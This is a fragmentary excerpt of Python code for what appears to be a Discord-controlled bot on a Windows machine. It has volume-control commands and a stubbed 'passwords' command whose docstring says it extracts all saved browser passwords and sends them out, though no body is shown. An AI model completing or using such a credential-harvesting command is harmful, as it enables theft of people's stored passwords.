...
def get_current_volume():
    """Get current system volume using pycaw"""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
...
async def volume(ctx, percent: int = None):
    """Set volume (0-100) or check current volume. Usage: !volume 50 or !volume"""
    try:
        if percent is None:
...
async def passwords(ctx):
    """Extract and send all saved passwords from browsers"""
